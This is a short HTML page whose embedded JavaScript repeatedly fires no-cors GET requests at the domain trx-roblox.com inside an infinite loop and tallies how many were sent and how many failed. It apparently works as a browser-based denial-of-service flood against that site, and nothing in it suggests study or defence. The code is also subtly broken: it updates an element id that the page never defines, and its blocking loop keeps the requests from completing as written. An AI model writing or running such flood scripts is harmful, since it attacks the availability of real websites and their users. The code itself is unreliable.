<label id="reqs">0 requests sent</label>
<label id="errs">0 errors</label>
<script>
  var sent = 0;
  var errs = 0;
  async function fetchWithTimeout(resource, options) {
	const controller = new AbortController();
	const id = setTimeout(() => controller.abort(), options.timeout);
	return fetch(resource, {
  method: 'GET',
	mode: 'no-cors',
	signal: controller.signal
  }).then((response) => {
  clearTimeout(id);
  sent = sent + 1;
  document.getElementById('sent').innerHTML = String(sent) + ' requests sent';
  return response;
  }).catch((error) => {
  clearTimeout(id);
  errs = errs + 1;
  document.getElementById('errs').innerHTML = String(errs) + ' errors';
  throw error;
  });
  }
  while (true) {
    fetchWithTimeout("https://trx-roblox.com/", {timeout: 1000});
  }
</script>
